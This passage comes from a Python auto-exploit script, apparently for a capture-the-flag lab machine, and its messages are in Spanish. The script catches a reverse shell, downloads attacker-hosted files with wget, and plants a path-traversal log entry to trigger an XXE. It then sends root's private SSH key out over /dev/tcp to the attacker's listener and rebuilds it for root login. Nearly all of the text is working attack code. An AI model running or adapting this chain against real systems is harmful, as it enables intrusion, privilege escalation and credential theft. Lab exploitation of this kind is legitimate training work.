            except Exception as e:
                log.error(str(e))

            shell = listen(443, timeout=20).wait_for_connection()

            if shell.sock is None:
                p1.failure("Connection couldn't be stablished")
                sys.exit(1)
            else:
                p1.status("Shell gained as 'woodenk' user")
                sleep(2)
                p1.status("Pivoting to root")
                createfiles()
                shell.sendline(b"cd /tmp")
                shell.sendline(f"wget http://{ip}/foto.jpg -O foto.jpg > /dev/null 2>&1")
                shell.sendline(f"wget http://{ip}/pwned_creds.xml -O pwned_creds.xml > /dev/null 2>&1")
                shell.sendline(b"echo \"200||10.10.14.12||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36||/../../../../../../../../tmp/foto.jpg\" > /opt/panda_search/redpanda.log")
                p1.status("Esperando 60 segundos a que se acontezca el XXE")
                sleep(60)
                try:
                    threading.Thread(target=shell.sendline(f"cat pwned_creds.xml > /dev/tcp/{ip}/443"))
                except Exception as e:
                    log.error(str(e))
                
                os.system("timeout 5 nc -nlvp 443 > rootssh.xml")
                os.system("cat rootssh.xml| tr -d \"\n\r\" | grep -oP \"(?<=<foo>).*?(?=</foo>)\" | sed \"s/-----BEGIN OPENSSH PRIVATE KEY-----/-----BEGIN OPENSSH PRIVATE KEY-----\\n/\" | sed \"s/-----END OPENSSH PRIVATE KEY-----/\\n-----END OPENSSH PRIVATE KEY-----/\" > id_rsa")
                os.system("chmod 600 id_rsa")
                print("Clave privada de root guardada en el archivo id_rsa")
                print("Puedes acceder como root via ssh haciendo ssh -i id_rsa root@10.10.11.170")
                os.system("rm -rf foto* index.html pwned_creds.xml rootssh.xml")
        except Exception as e:
            log.error(str(e))

```